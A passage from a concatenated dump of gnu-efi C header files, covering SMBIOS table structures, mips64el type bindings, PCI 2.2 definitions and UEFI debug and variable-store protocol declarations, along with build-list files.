    IN EFI_UNICODE_COLLATION_INTERFACE  *This,
    IN CHAR16                           *Str
    );

BOOLEAN
LibMatchDevicePaths (
    IN  EFI_DEVICE_PATH *Multi,
    IN  EFI_DEVICE_PATH *Single
    );

EFI_DEVICE_PATH *
LibDuplicateDevicePathInstance (
    IN EFI_DEVICE_PATH  *DevPath
    );


//
// Globals
//
extern BOOLEAN                          LibInitialized;
extern BOOLEAN                          LibFwInstance;
extern EFI_HANDLE			LibImageHandle;
extern SIMPLE_TEXT_OUTPUT_INTERFACE     *LibRuntimeDebugOut;
extern EFI_UNICODE_COLLATION_INTERFACE  *UnicodeInterface;
extern EFI_UNICODE_COLLATION_INTERFACE  LibStubUnicodeInterface;
extern EFI_RAISE_TPL                    LibRuntimeRaiseTPL;
extern EFI_RESTORE_TPL                  LibRuntimeRestoreTPL;

```

`include/gnu-efi/libsmbios.h`:

```h
#ifndef _LIB_SMBIOS_H
#define _LIB_SMBIOS_H
/*++

Copyright (c) 2000  Intel Corporation

Module Name:

    LibSmbios.h

Abstract:

    Lib include  for SMBIOS services. Used to get system serial number and GUID

Revision History

--*/

//
// Define SMBIOS tables.
//
#pragma pack(1)
typedef struct {
    UINT8   AnchorString[4];
    UINT8   EntryPointStructureChecksum;
    UINT8   EntryPointLength;
    UINT8   MajorVersion;
    UINT8   MinorVersion;
    UINT16  MaxStructureSize;
    UINT8   EntryPointRevision;
    UINT8   FormattedArea[5];
    UINT8   IntermediateAnchorString[5];
    UINT8   IntermediateChecksum;
    UINT16  TableLength;
    UINT32  TableAddress;
    UINT16  NumberOfSmbiosStructures;
    UINT8   SmbiosBcdRevision;
} SMBIOS_STRUCTURE_TABLE;

typedef struct {
    UINT8   AnchorString[5];
    UINT8   EntryPointStructureChecksum;
    UINT8   EntryPointLength;
    UINT8   MajorVersion;
    UINT8   MinorVersion;
    UINT8   DocRev;
    UINT8   EntryPointRevision;
    UINT8   Reserved;
    UINT32  TableMaximumSize;
    UINT64  TableAddress;
} SMBIOS3_STRUCTURE_TABLE;

//
// Please note that SMBIOS structures can be odd byte aligned since the
//  unformated section of each record is a set of arbitrary size strings.
//

typedef struct {
    UINT8   Type;
    UINT8   Length;
    UINT8   Handle[2];
} SMBIOS_HEADER;

typedef UINT8   SMBIOS_STRING;

typedef struct {
    SMBIOS_HEADER   Hdr;
    SMBIOS_STRING   Vendor;
    SMBIOS_STRING   BiosVersion;
    UINT8           BiosSegment[2];
    SMBIOS_STRING   BiosReleaseDate;
    UINT8           BiosSize;
    UINT8           BiosCharacteristics[8];
} SMBIOS_TYPE0;

typedef struct {
    SMBIOS_HEADER   Hdr;
    SMBIOS_STRING   Manufacturer;
    SMBIOS_STRING   ProductName;
    SMBIOS_STRING   Version;
    SMBIOS_STRING   SerialNumber;

    //
    // always byte copy this data to prevent alignment faults!
    //
    EFI_GUID        Uuid;

    UINT8           WakeUpType;
} SMBIOS_TYPE1;

typedef struct {
    SMBIOS_HEADER   Hdr;
    SMBIOS_STRING   Manufacturer;
    SMBIOS_STRING   ProductName;
    SMBIOS_STRING   Version;
    SMBIOS_STRING   SerialNumber;
} SMBIOS_TYPE2;

typedef struct {
    SMBIOS_HEADER   Hdr;
    SMBIOS_STRING   Manufacturer;
    UINT8           Type;
    SMBIOS_STRING   Version;
    SMBIOS_STRING   SerialNumber;
    SMBIOS_STRING   AssetTag;
    UINT8           BootupState;
    UINT8           PowerSupplyState;
    UINT8           ThermalState;
    UINT8           SecurityStatus;
    UINT8           OemDefined[4];
} SMBIOS_TYPE3;

typedef struct {
    SMBIOS_HEADER   Hdr;
    UINT8           Socket;
    UINT8           ProcessorType;
    UINT8           ProcessorFamily;
    SMBIOS_STRING   ProcessorManufacture;
    UINT8           ProcessorId[8];
    SMBIOS_STRING   ProcessorVersion;
    UINT8           Voltage;
    UINT8           ExternalClock[2];
    UINT8           MaxSpeed[2];
    UINT8           CurrentSpeed[2];
    UINT8           Status;
    UINT8           ProcessorUpgrade;
    UINT8           L1CacheHandle[2];
    UINT8           L2CacheHandle[2];
    UINT8           L3CacheHandle[2];
} SMBIOS_TYPE4;

typedef union {
    SMBIOS_HEADER   *Hdr;
    SMBIOS_TYPE0    *Type0;
    SMBIOS_TYPE1    *Type1;
    SMBIOS_TYPE2    *Type2;
    SMBIOS_TYPE3    *Type3;
    SMBIOS_TYPE4    *Type4;
    UINT8           *Raw;
} SMBIOS_STRUCTURE_POINTER;
#pragma pack()

#endif

```

`include/gnu-efi/make.inf`:

```inf
#
#
#

[sources]
    efi.h
    efiapi.h
    eficon.h
    efidebug.h
    efidef.h
    efidevp.h
    efierr.h
    efifs.h
    efilib.h
    efipart.h
    efipciio.h
    efiprot.h
    efipxebc.h
    efistdarg.h
    efinet.h
    efiip.h
    efiudp.h
    efitcp.h

[ia32sources]
    efibind.h
    pe.h
    efilibplat.h

[ia64sources]
    efibind.h
    pe.h
    efilibplat.h

```

`include/gnu-efi/makefile.hdr`:

```hdr

#
# This is a machine generated file - DO NOT EDIT
#    Generated by genmake.exe
#    Generated from make.inf
#    Copyright (c) 1998  Intel Corporation
#

INC_DEPS = $(INC_DEPS) \
    $(SDK_INSTALL_DIR)\include\efi\efi.h \
    $(SDK_INSTALL_DIR)\include\efi\efiapi.h \
    $(SDK_INSTALL_DIR)\include\efi\eficon.h \
    $(SDK_INSTALL_DIR)\include\efi\efidebug.h \
    $(SDK_INSTALL_DIR)\include\efi\efidef.h \
    $(SDK_INSTALL_DIR)\include\efi\efidevp.h \
    $(SDK_INSTALL_DIR)\include\efi\efierr.h \
    $(SDK_INSTALL_DIR)\include\efi\efifs.h \
    $(SDK_INSTALL_DIR)\include\efi\efilib.h \
    $(SDK_INSTALL_DIR)\include\efi\efipart.h \
    $(SDK_INSTALL_DIR)\include\efi\efipciio.h \
    $(SDK_INSTALL_DIR)\include\efi\efiprot.h \
    $(SDK_INSTALL_DIR)\include\efi\efipxebc.h \
    $(SDK_INSTALL_DIR)\include\efi\efistdarg.h \
    $(SDK_INSTALL_DIR)\include\efi\efinet.h \
    $(SDK_INSTALL_DIR)\include\efi\efiip.h \
    $(SDK_INSTALL_DIR)\include\efi\efiudp.h \
    $(SDK_INSTALL_DIR)\include\efi\efitcp.h \


!IF "$(PROCESSOR)" == "Ia32"
INC_DEPS = $(INC_DEPS) \
    $(SDK_INSTALL_DIR)\include\efi\Ia32\efibind.h \
    $(SDK_INSTALL_DIR)\include\efi\Ia32\pe.h \
    $(SDK_INSTALL_DIR)\include\efi\Ia32\efilibplat.h \


!ENDIF


!IF "$(PROCESSOR)" == "Ia64"
INC_DEPS = $(INC_DEPS) \
    $(SDK_INSTALL_DIR)\include\efi\Ia64\efibind.h \
    $(SDK_INSTALL_DIR)\include\efi\Ia64\pe.h \
    $(SDK_INSTALL_DIR)\include\efi\Ia64\efilibplat.h \


!ENDIF


```

`include/gnu-efi/mips64el/efibind.h`:

```h
/*
 * Copright (C) 2014 - 2015 Linaro Ltd.
 * Author: Ard Biesheuvel <ard.biesheuvel@linaro.org>
 * Copright (C) 2017 Lemote Co.
 * Author: Heiher <r@hev.cc>
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice and this list of conditions, without modification.
 * 2. The name of the author may not be used to endorse or promote products
 *    derived from this software without specific prior written permission.
 *
 * Alternatively, this software may be distributed under the terms of the
 * GNU General Public License as published by the Free Software Foundation;
 * either version 2 of the License, or (at your option) any later version.
 */

#if !defined(__STDC_VERSION__) || (__STDC_VERSION__ < 199901L ) && !defined(__cplusplus)

// ANSI C 1999/2000 stdint.h integer width declarations

typedef unsigned long       uint64_t;
typedef long                int64_t;
typedef unsigned int        uint32_t;
typedef int                 int32_t;
typedef unsigned short      uint16_t;
typedef short               int16_t;
typedef unsigned char       uint8_t;
typedef signed char         int8_t;   // unqualified 'char' is unsigned on ARM
typedef uint64_t            uintptr_t;
typedef int64_t             intptr_t;

#else
#include <stdint.h>
#endif

//
// Basic EFI types of various widths
//

#ifndef __WCHAR_TYPE__
# define __WCHAR_TYPE__ short
#endif

typedef uint64_t   UINT64;
typedef int64_t    INT64;

typedef uint32_t   UINT32;
typedef int32_t    INT32;

typedef uint16_t   UINT16;
typedef int16_t    INT16;
typedef uint8_t    UINT8;
typedef int8_t     INT8;
typedef __WCHAR_TYPE__ WCHAR;

#undef VOID
#define VOID    void

typedef int64_t    INTN;
typedef uint64_t   UINTN;

#define EFIERR(a)           (0x8000000000000000 | a)
#define EFI_ERROR_MASK      0x8000000000000000
#define EFIERR_OEM(a)       (0xc000000000000000 | a)

#define BAD_POINTER         0xFBFBFBFBFBFBFBFB
#define MAX_ADDRESS         0xFFFFFFFFFFFFFFFF

#define BREAKPOINT()        while (TRUE);    // Make it hang on Bios[Dbg]32

//
// Pointers must be aligned to these address to function
//

#define MIN_ALIGNMENT_SIZE  8

#define ALIGN_VARIABLE(Value ,Adjustment) \
            (UINTN)Adjustment = 0; \
            if((UINTN)Value % MIN_ALIGNMENT_SIZE) \
                (UINTN)Adjustment = MIN_ALIGNMENT_SIZE - ((UINTN)Value % MIN_ALIGNMENT_SIZE); \
            Value = (UINTN)Value + (UINTN)Adjustment


//
// Define macros to build data structure signatures from characters.
//

#define EFI_SIGNATURE_16(A,B)             ((A) | (B<<8))
#define EFI_SIGNATURE_32(A,B,C,D)         (EFI_SIGNATURE_16(A,B)     | (EFI_SIGNATURE_16(C,D)     << 16))
#define EFI_SIGNATURE_64(A,B,C,D,E,F,G,H) (EFI_SIGNATURE_32(A,B,C,D) | ((UINT64)(EFI_SIGNATURE_32(E,F,G,H)) << 32))

//
// EFIAPI - prototype calling convention for EFI function pointers
// BOOTSERVICE - prototype for implementation of a boot service interface
// RUNTIMESERVICE - prototype for implementation of a runtime service interface
// RUNTIMEFUNCTION - prototype for implementation of a runtime function that is not a service
// RUNTIME_CODE - pragma macro for declaring runtime code
//

#ifndef EFIAPI          // Forces EFI calling conventions reguardless of compiler options
#define EFIAPI          // Substitute expresion to force C calling convention
#endif

#define BOOTSERVICE
#define RUNTIMESERVICE
#define RUNTIMEFUNCTION


#define RUNTIME_CODE(a)         alloc_text("rtcode", a)
#define BEGIN_RUNTIME_DATA()    data_seg("rtdata")
#define END_RUNTIME_DATA()      data_seg("")

#define VOLATILE                volatile

#define MEMORY_FENCE            __sync_synchronize

//
// When build similiar to FW, then link everything together as
// one big module.
//

#define EFI_DRIVER_ENTRY_POINT(InitFunction)    \
    UINTN                                       \
    InitializeDriver (                          \
        VOID    *ImageHandle,                   \
        VOID    *SystemTable                    \
        )                                       \
    {                                           \
        return InitFunction(ImageHandle,        \
                SystemTable);                   \
    }                                           \
                                                \
    EFI_STATUS efi_main(                        \
        EFI_HANDLE image,                       \
        EFI_SYSTEM_TABLE *systab                \
        ) __attribute__((weak,                  \
                alias ("InitializeDriver")));

#define LOAD_INTERNAL_DRIVER(_if, type, name, entry)    \
        (_if)->LoadInternal(type, name, entry)


//
// Some compilers don't support the forward reference construct:
//  typedef struct XXXXX
//
// The following macro provide a workaround for such cases.

#define INTERFACE_DECL(x) struct x

#define uefi_call_wrapper(func, va_num, ...) func(__VA_ARGS__)
#define EFI_FUNCTION

static inline UINT64 swap_uint64 (UINT64 v)
{
	asm volatile (
		"dsbh	%[v], %[v] \n\t"
		"dshd	%[v], %[v] \n\t"
		:[v]"+r"(v)
	);

	return v;
}

```

`include/gnu-efi/mips64el/efilibplat.h`:

```h
/*++

Copyright (c) 1998  Intel Corporation

Module Name:

    efilibplat.h

Abstract:

    EFI to compile bindings




Revision History

--*/

VOID
InitializeLibPlatform (
    IN EFI_HANDLE           ImageHandle,
    IN EFI_SYSTEM_TABLE     *SystemTable
    );


```

`include/gnu-efi/mips64el/efisetjmp_arch.h`:

```h
#ifndef GNU_EFI_MIPS64EL_SETJMP_H
#define GNU_EFI_MIPS64EL_SETJMP_H

#define JMPBUF_ALIGN 8

typedef struct {
	/* GP regs */
	UINT64	RA;
	UINT64	SP;
	UINT64	FP;
	UINT64	GP;
	UINT64	S0;
	UINT64	S1;
	UINT64	S2;
	UINT64	S3;
	UINT64	S4;
	UINT64	S5;
	UINT64	S6;
	UINT64	S7;

#ifdef	__mips_hard_float
	/* FP regs */
	UINT64	F24;
	UINT64	F25;
	UINT64	F26;
	UINT64	F27;
	UINT64	F28;
	UINT64	F29;
	UINT64	F30;
	UINT64	F31;
#endif
} ALIGN(JMPBUF_ALIGN) jmp_buf[1];

#endif /* GNU_EFI_MIPS64EL_SETJMP_H */

```

`include/gnu-efi/pci22.h`:

```h
#ifndef _PCI22_H
#define _PCI22_H

/*++

Copyright (c) 1999  Intel Corporation

Module Name:

    pci22.h
    
Abstract:      
    Support for PCI 2.2 standard.




Revision History

--*/

#ifdef SOFT_SDV
#define PCI_MAX_BUS     1
#else
#define PCI_MAX_BUS     255
#endif

#define PCI_MAX_DEVICE  31
#define PCI_MAX_FUNC    7

//
// Command
//
#define PCI_VGA_PALETTE_SNOOP_DISABLED   0x20

#pragma pack(1)
typedef struct {
    UINT16      VendorId;
    UINT16      DeviceId;
    UINT16      Command;
    UINT16      Status;
    UINT8       RevisionID;
    UINT8       ClassCode[3];
    UINT8       CacheLineSize;
    UINT8       LaytencyTimer;
    UINT8       HeaderType;
    UINT8       BIST;
} PCI_DEVICE_INDEPENDENT_REGION;

typedef struct {
    UINT32      Bar[6];
    UINT32      CISPtr;
    UINT16      SubsystemVendorID;
    UINT16      SubsystemID;
    UINT32      ExpansionRomBar;
    UINT32      Reserved[2];
    UINT8       InterruptLine;
    UINT8       InterruptPin;
    UINT8       MinGnt;
    UINT8       MaxLat;     
} PCI_DEVICE_HEADER_TYPE_REGION;

typedef struct {
    PCI_DEVICE_INDEPENDENT_REGION   Hdr;
    PCI_DEVICE_HEADER_TYPE_REGION   Device;
} PCI_TYPE00;

typedef struct {              
    UINT32      Bar[2];
    UINT8       PrimaryBus;
    UINT8       SecondaryBus;
    UINT8       SubordinateBus;
    UINT8       SecondaryLatencyTimer;
    UINT8       IoBase;
    UINT8       IoLimit;
    UINT16      SecondaryStatus;
    UINT16      MemoryBase;
    UINT16      MemoryLimit;
    UINT16      PrefetchableMemoryBase;
    UINT16      PrefetchableMemoryLimit;
    UINT32      PrefetchableBaseUpper32;
    UINT32      PrefetchableLimitUpper32;
    UINT16      IoBaseUpper16;
    UINT16      IoLimitUpper16;
    UINT32      Reserved;
    UINT32      ExpansionRomBAR;
    UINT8       InterruptLine;
    UINT8       InterruptPin;
    UINT16      BridgeControl;
} PCI_BRIDGE_CONTROL_REGISTER;

#define PCI_CLASS_DISPLAY_CTRL          0x03
#define PCI_CLASS_VGA                   0x00

#define PCI_CLASS_BRIDGE                0x06
#define PCI_CLASS_ISA                   0x01
#define PCI_CLASS_ISA_POSITIVE_DECODE   0x80

#define PCI_CLASS_NETWORK               0x02 
#define PCI_CLASS_ETHERNET              0x00
        
#define HEADER_TYPE_DEVICE              0x00
#define HEADER_TYPE_PCI_TO_PCI_BRIDGE   0x01
#define HEADER_TYPE_MULTI_FUNCTION      0x80
#define HEADER_LAYOUT_CODE              0x7f

#define IS_PCI_BRIDGE(_p) ((((_p)->Hdr.HeaderType) & HEADER_LAYOUT_CODE) == HEADER_TYPE_PCI_TO_PCI_BRIDGE)        
#define IS_PCI_MULTI_FUNC(_p)   (((_p)->Hdr.HeaderType) & HEADER_TYPE_MULTI_FUNCTION)         

typedef struct {
    PCI_DEVICE_INDEPENDENT_REGION   Hdr;
    PCI_BRIDGE_CONTROL_REGISTER     Bridge;
} PCI_TYPE01;

typedef struct {
    UINT8   Register;
    UINT8   Function;
    UINT8   Device;
    UINT8   Bus;
    UINT8   Reserved[4];
} DEFIO_PCI_ADDR;

typedef struct {
    UINT32  Reg     : 8;
    UINT32  Func    : 3;
    UINT32  Dev     : 5;
    UINT32  Bus     : 8;
    UINT32  Reserved: 7;
    UINT32  Enable  : 1;
} PCI_CONFIG_ACCESS_CF8;

#pragma pack()

#define EFI_ROOT_BRIDGE_LIST    'eprb'
typedef struct {
    UINTN           Signature;

    UINT16          BridgeNumber;
    UINT16          PrimaryBus;
    UINT16          SubordinateBus;

    EFI_DEVICE_PATH *DevicePath;

    LIST_ENTRY      Link;
} PCI_ROOT_BRIDGE_ENTRY;


#define PCI_EXPANSION_ROM_HEADER_SIGNATURE        0xaa55
#define EFI_PCI_EXPANSION_ROM_HEADER_EFISIGNATURE 0x0EF1
#define PCI_DATA_STRUCTURE_SIGNATURE              EFI_SIGNATURE_32('P','C','I','R')

#pragma pack(1)
typedef struct {
    UINT16          Signature;              // 0xaa55
    UINT8           Reserved[0x16];
    UINT16          PcirOffset;
} PCI_EXPANSION_ROM_HEADER;


typedef struct {
    UINT16          Signature;              // 0xaa55
    UINT16          InitializationSize;
    UINT16          EfiSignature;           // 0x0EF1
    UINT16          EfiSubsystem;
    UINT16          EfiMachineType;
    UINT8           Reserved[0x0A];
    UINT16          EfiImageHeaderOffset;
    UINT16          PcirOffset;
} EFI_PCI_EXPANSION_ROM_HEADER;

typedef struct {
    UINT32          Signature;              // "PCIR" 
    UINT16          VendorId;
    UINT16          DeviceId;
    UINT16          Reserved0;
    UINT16          Length;
    UINT8           Revision;
    UINT8           ClassCode[3];
    UINT16          ImageLength;
    UINT16          CodeRevision;
    UINT8           CodeType;
    UINT8           Indicator;
    UINT16          Reserved1;
} PCI_DATA_STRUCTURE;
#pragma pack()

#endif
    




    

```

`include/gnu-efi/protocol/adapterdebug.h`:

```h
#ifndef _ADAPTER_DEBUG_H
#define _ADAPTER_DEBUG_H

/*++

Copyright (c) 1999  Intel Corporation

Module Name:

    AdapterDebug.h
    
Abstract:

    Protocol to debug the EDD 3.0 enablement of BIOS option ROMs



Revision History

--*/

// {82F86881-282B-11d4-BC7D-0080C73C8881}
#define ADAPTER_DEBUG_PROTOCOL \
{ 0x82f86881, 0x282b, 0x11d4, {0xbc, 0x7d, 0x0, 0x80, 0xc7, 0x3c, 0x88, 0x81} }

//
// This protocol points to the BIOS_LEGACY_DRIVE data structure
//  see edd.h for more details
//

#endif


```

`include/gnu-efi/protocol/eficonsplit.h`:

```h
#ifndef _EFI_CONFORK_H
#define _EFI_CONFORK_H
/*++

Copyright (c) 1999  Intel Corporation

Module Name:

Abstract:



Revision History

--*/



//
// ConOut Forker Protocol
//

#define TEXT_OUT_SPLITER_PROTOCOL    \
    { 0x56d830a0, 0x7e7a, 0x11d3, {0xbb, 0xa0, 0x0, 0xa0, 0xc9, 0x69, 0x72, 0x3b} }

#define ERROR_OUT_SPLITER_PROTOCOL    \
    { 0xf0ba9039, 0x68f1, 0x425e, {0xaa, 0x7f, 0xd9, 0xaa, 0xf9, 0x1b, 0x82, 0xa1}}

#define TEXT_IN_SPLITER_PROTOCOL    \
    { 0xf9a3c550, 0x7fb5, 0x11d3, {0xbb, 0xa0, 0x0, 0xa0, 0xc9, 0x69, 0x72, 0x3b} }

#endif

```

`include/gnu-efi/protocol/efidbg.h`:

```h
/*
 * Copyright (c) 1999, 2000
 * Intel Corporation.
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 * 
 *    This product includes software developed by Intel Corporation and
 *    its contributors.
 * 
 * 4. Neither the name of Intel Corporation or its contributors may be
 *    used to endorse or promote products derived from this software
 *    without specific prior written permission.
 * 
 * THIS SOFTWARE IS PROVIDED BY INTEL CORPORATION AND CONTRIBUTORS ``AS IS''
 * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL INTEL CORPORATION OR CONTRIBUTORS BE
 * LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
 * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
 * INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
 * CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
 * ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF
 * THE POSSIBILITY OF SUCH DAMAGE.
 * 
 */


#ifndef _EFIDBG_H_
#define _EFIDBG_H_

#include "eficontext.h"
#include "efiser.h"

typedef struct _DEBUGPORT_16550_CONFIG_DATA {
        UINT32							PortAddress;
        UINT64                          BaudRate;
    	UINT32               			ReceiveFifoDepth;
    	UINT32               			Timeout;
        UINT8                           Parity;
        UINT8                           DataBits;
        UINT8                           StopBits;
	    UINT32                       	ControlMask;
        BOOLEAN							RtsCtsEnable;		// RTS, CTS control
} DEBUGPORT_16550_CONFIG_DATA;

typedef struct _DEBUGPORT_16550_DEVICE_PATH {
        EFI_DEVICE_PATH                 Header;
        DEBUGPORT_16550_CONFIG_DATA		ConfigData;
} DEBUGPORT_16550_DEVICE_PATH;

typedef union {
    EFI_DEVICE_PATH                     DevPath;
    DEBUGPORT_16550_DEVICE_PATH         Uart;
    // add new types of debugport device paths to this union...
} DEBUGPORT_DEV_PATH;


//
// Debug Support protocol {2755590C-6F3C-42FA-9EA4-A3BA543CDA25}
//

#define DEBUG_SUPPORT_PROTOCOL \
{ 0x2755590C, 0x6F3C, 0x42fa, 0x9E, 0xA4, 0xA3, 0xBA, 0x54, 0x3C, 0xDA, 0x25 }


typedef UINTN EXCEPTION_TYPE;

typedef
VOID
(*EXCEPTION_HANDLER) (
	IN EXCEPTION_TYPE ExceptionType,
    IN SYSTEM_CONTEXT *SystemContext
    );

typedef
EFI_STATUS
(EFIAPI *EFI_REGISTER_TIMER_TICK_CALLBACK) (
    IN struct _EFI_DEBUG_SUPPORT_INTERFACE  *This,
    IN EXCEPTION_HANDLER	                TimerTickCallback
    );

typedef
EFI_STATUS
(EFIAPI *EFI_REGISTER_EXCEPTION_HANDLER) (
    IN     struct _EFI_DEBUG_SUPPORT_INTERFACE  *This,
    IN     EXCEPTION_HANDLER                    ExceptionHandler,
    IN     EXCEPTION_TYPE                       ExceptionType
    );

typedef
EFI_STATUS
(EFIAPI *EFI_IP_CALL_TRACE) (
    IN     struct _EFI_DEBUG_SUPPORT_INTERFACE  *This
    );


#define EFI_DEBUG_SUPPORT_INTERFACE_REVISION     0x00010000

typedef struct _EFI_DEBUG_SUPPORT_INTERFACE {
    UINT32                          	Revision;
    EFI_REGISTER_TIMER_TICK_CALLBACK	RegisterTimerTickCallback;
    EFI_REGISTER_EXCEPTION_HANDLER  	RegisterExceptionHandler;
    EFI_IP_CALL_TRACE               	IpCallTrace;
} EFI_DEBUG_SUPPORT_INTERFACE;


//
// Debugport io protocol {EBA4E8D2-3858-41EC-A281-2647BA9660D0}
//

#define DEBUGPORT_IO_PROTOCOL \
{ 0XEBA4E8D2, 0X3858, 0X41EC, 0XA2, 0X81, 0X26, 0X47, 0XBA, 0X96, 0X60, 0XD0 }
 

typedef
EFI_STATUS
(EFIAPI *EFI_DEBUGPORT_IO_RESET) (
    IN struct _EFI_DEBUGPORT_IO_INTERFACE  	*This
    );

typedef
EFI_STATUS
(EFIAPI *EFI_DEBUGPORT_IO_READ) (
    IN     struct _EFI_DEBUGPORT_IO_INTERFACE	*This,
    IN OUT UINTN                    		*BufferSize,
    OUT VOID                         		*Buffer
    );

typedef
EFI_STATUS
(EFIAPI *EFI_DEBUGPORT_IO_WRITE) (
    IN     struct _EFI_DEBUGPORT_IO_INTERFACE *This,
    IN OUT UINTN                    		*BufferSize,
    IN VOID                         		*Buffer
    );

#define EFI_DEBUGPORT_IO_INTERFACE_REVISION   0x00010000

typedef struct _EFI_DEBUGPORT_IO_INTERFACE {
    UINT32                          		Revision;
    EFI_DEBUGPORT_IO_READ					Read;
    EFI_DEBUGPORT_IO_WRITE					Write;
    EFI_DEBUGPORT_IO_RESET					Reset;
} EFI_DEBUGPORT_IO_INTERFACE;


//
// Debugport UART16550 control protocol {628EA978-4C26-4605-BC02-A42A496917DD}
//

#define DEBUGPORT_UART16550_CONTROL_PROTOCOL \
{ 0X628EA978, 0X4C26, 0X4605, 0XBC, 0X2, 0XA4, 0X2A, 0X49, 0X69, 0X17, 0XDD }
 
// Note: The definitions for EFI_PARITY_TYPE, EFI_STOP_BITS_TYPE, and 
// SERIAL_IO_MODE are included from efiser.h

typedef
EFI_STATUS
(EFIAPI *EFI_UART16550_SET_ATTRIBUTES) (
    IN struct _EFI_DEBUGPORT_UART16550_CONTROL_INTERFACE  	*This,
    IN UINT64                       	BaudRate,
    IN UINT32                       	ReceiveFifoDepth,
    IN UINT32                       	Timeout,
    IN EFI_PARITY_TYPE       			Parity,
    IN UINT8                        	DataBits,
    IN EFI_STOP_BITS_TYPE    			StopBits
    );

typedef
EFI_STATUS
(EFIAPI *EFI_UART16550_SET_CONTROL_BITS) (
    IN struct _EFI_DEBUGPORT_UART16550_CONTROL_INTERFACE  	*This,
    IN UINT32                       	Control
    );

typedef
EFI_STATUS
(EFIAPI *EFI_UART16550_GET_CONTROL_BITS) (
    IN struct _EFI_DEBUGPORT_UART16550_CONTROL_INTERFACE	*This,
    OUT UINT32                      	*Control
    );

#define EFI_DEBUGPORT_UART16550_CONTROL_INTERFACE_REVISION   0x00010000

typedef struct _EFI_DEBUGPORT_UART16550_CONTROL_INTERFACE {
    UINT32                          	Revision;
	EFI_UART16550_SET_ATTRIBUTES		SetAttributes;
	EFI_UART16550_SET_CONTROL_BITS		SetControl;
	EFI_UART16550_GET_CONTROL_BITS 		GetControl;
	DEBUGPORT_16550_CONFIG_DATA			*Mode;
} EFI_DEBUGPORT_UART16550_CONTROL_INTERFACE;
        

#define DEVICE_PATH_DEBUGPORT DEBUGPORT_IO_PROTOCOL
        
#endif /* _EFIDBG_H_ */

```

`include/gnu-efi/protocol/efivar.h`:

```h
/*++

Copyright (c) 1998  Intel Corporation

Module Name:

Abstract:



Revision History

--*/



//
// The variable store protocol interface is specific to the reference
// implementation.  The initialization code adds variable store devices
// to the system, and the FW connects to the devices to provide the
// variable store interfaces through these devices.
//

//
// Variable Store Device protocol
//

#define VARIABLE_STORE_PROTOCOL    \
    { 0xf088cd91, 0xa046, 0x11d2, {0x8e, 0x42, 0x0, 0xa0, 0xc9, 0x69, 0x72, 0x3b} }

INTERFACE_DECL(_EFI_VARIABLE_STORE);

typedef
EFI_STATUS
(EFIAPI *EFI_STORE_CLEAR) (
    IN struct _EFI_VARIABLE_STORE   *This,
    IN UINTN                        BankNo,
    IN OUT VOID                     *Scratch
    );


typedef
EFI_STATUS
(EFIAPI *EFI_STORE_READ) (
    IN struct _EFI_VARIABLE_STORE   *This,
    IN UINTN                        BankNo,
    IN UINTN                        Offset,
    IN UINTN                        BufferSize,
    OUT VOID                        *Buffer
    );

typedef
EFI_STATUS
(EFIAPI *EFI_STORE_UPDATE) (
    IN struct _EFI_VARIABLE_STORE   *This,
    IN UINTN                        BankNo,
    IN UINTN                        Offset,
    IN UINTN                        BufferSize,
    IN VOID                         *Buffer
    );

typedef
EFI_STATUS
(EFIAPI *EFI_STORE_SIZE) (
    IN struct _EFI_VARIABLE_STORE   *This,
    IN UINTN                        NoBanks
    );

typedef
EFI_STATUS
(EFIAPI *EFI_TRANSACTION_UPDATE) (
    IN struct _EFI_VARIABLE_STORE   *This,
    IN UINTN                        BankNo,
    IN VOID                         *NewContents
    );

typedef struct _EFI_VARIABLE_STORE {

    //
    // Number of banks and bank size
    //

    UINT32                      Attributes;
    UINT32                      BankSize;
    UINT32                      NoBanks;

    //
    // Functions to access the storage banks
    //

    EFI_STORE_CLEAR             ClearStore;
    EFI_STORE_READ              ReadStore;
    EFI_STORE_UPDATE            UpdateStore;
    EFI_STORE_SIZE              SizeStore OPTIONAL;
    EFI_TRANSACTION_UPDATE      TransactionUpdate OPTIONAL;

} EFI_VARIABLE_STORE;


//
//
// ClearStore()     - A function to clear the requested storage bank.  A cleared
//      bank contains all "on" bits.
//
// ReadStore()      - Read data from the requested store.
//
// UpdateStore()    - Updates data on the requested store. The FW will only
//      ever issue updates to clear bits in the store. Updates must be
//      performed in LSb to MSb order of the update buffer.
//
// SizeStore()      - An optional function for non-runtime stores that can be
//      dynamically sized.  The FW will only ever increase or decrease the store
//      by 1 banksize at a time, and it is always adding or removing a bank from 
//      the end of the store.
//
// By default the FW will update variables and storage banks in an
// "atomic" manner by keeping 1 old copy of the data during an update,
// and recovering appropiately if the power is lost during the middle
// of an operation.  To do this the FW needs to have multiple banks
// of storage dedicated to its use. If that's not possible, the driver 
// can implement an atomic bank update function and the FW will allow 
// 1 bank in this case.  (It will allow any number of banks,
// but it won't require an "extra" bank to provide its bank transaction 
// function).
//
// TransactionUpdate()  - An optional function that can clear & update an 
//      entire bank in an "atomic" fashion.  If the operation fails in the 
//      middle the driver is responsible for having either the previous copy 
//      of the bank's data or the new copy.  A copy that's partially written
//      is not valid as internal data settings may get lost.  Supply this
//      function only when needed.
//


```

`include/gnu-efi/protocol/ia64/eficontext.h`:

```h
/*
 * Copyright (c) 1999, 2000
 * Intel Corporation.
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
